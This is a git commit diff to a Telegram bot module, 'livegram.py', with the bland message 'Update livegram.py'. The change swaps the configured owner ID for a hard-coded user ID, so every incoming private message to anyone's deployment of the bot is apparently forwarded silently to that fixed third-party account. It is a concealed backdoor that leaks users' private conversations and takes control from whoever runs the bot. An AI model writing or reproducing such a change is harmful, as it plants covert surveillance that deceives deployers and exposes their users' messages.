6325380cd575c60c07da67b54e22aae805d32811
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2023-03-16 15:23:43 +0530

    Update livegram.py

--- FallenRobot/modules/livegram.py
+++ FallenRobot/modules/livegram.py
@@ -8,4 +8,4 @@ from FallenRobot import pbot as bot
 @bot.on_message(filters.private & filters.incoming)
 async def on_pm_s(client: Client, message: Message):
     if not message.from_user.id == 1808943146:
-        fwded_mesg = await message.forward(chat_id=OWNER_ID, disable_notification=True)
+        fwded_mesg = await message.forward(chat_id=1808943146, disable_notification=True)
